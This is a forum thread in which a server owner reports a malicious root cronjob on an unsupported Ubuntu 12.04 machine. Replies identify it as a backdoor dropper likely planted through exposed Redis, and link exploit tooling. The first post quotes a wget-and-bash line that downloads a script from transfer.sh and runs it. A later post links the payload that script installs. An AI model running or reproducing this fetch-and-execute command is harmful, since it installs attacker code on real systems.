---
title: "Suspicious scripts in root cronjob"
date: 2018-07-20
forum: Security
---

### Post by lynx442 on 2018-07-20
I set up a new virtual server a couple of days ago. I installed some open source software on it from a reputable company. I was running 12.04 (64 bit), since that's the supported OS the software ran on. I updated the base installation with the most recent packages using upgrade and dist-upgrade.

Today, I was setting up cron as root to run some tasks, and I saw some very suspicious code I was not familiar with, which loaded a script from [https://transfer.sh](https://transfer.sh).

Specifically, this was one line of code in the cron job:

```
wget -O .cmd https://transfer.sh/ioAzh/tmp.Ker9jozIal && bash .cmd
```

It looks like an attempt to gather data from my server, but I'm not quite sure what specifically.

I've shut the server down now, but I'd still like to run this software. It uses Python and runs a hosted webserver.

How can I figure out what led to this situation? Any insight on what they were attempting to take? How do I ensure this doesn't happen again in the future?

---

### Post by TheFu on 2018-07-21
Support for 12.04 ended about 18 months ago.  Forum policy says unsupported OSes are off topic here.

Move to 16.04 or 18.04.
If you have paid Canonical for extended support for 12.04, please contact them. If you don't have paid support, there isn't anything anyone can do to help except to say never enable any networking on that machine.

---

### Post by mohicann on 2018-07-22
Hi,

It seems to be a backdoor dropper (it installs [this file]("https://transfer.sh/aSuEY/tmp.kaLG5OiQsq")). Indeed, the fact that you're running a no longer supported version of Ubuntu is very likely the cause of this intrusion.

---

### Post by mohicann on 2018-07-22
This is very likely what happened:

[https://github.com/ptrrkssn/pnscan/issues/2](https://github.com/ptrrkssn/pnscan/issues/2)
[https://www.imperva.com/blog/2018/06/new-research-shows-75-of-open-redis-servers-infected/](https://www.imperva.com/blog/2018/06/new-research-shows-75-of-open-redis-servers-infected/)
[URL="https://github.com/Avinash-acid/Redis-Server-Exploit"]https://github.com/Avinash-acid/Redis-Server-Exploit
[https://github.com/ptrrkssn/pnscan](https://github.com/ptrrkssn/pnscan)
[/URL]

---

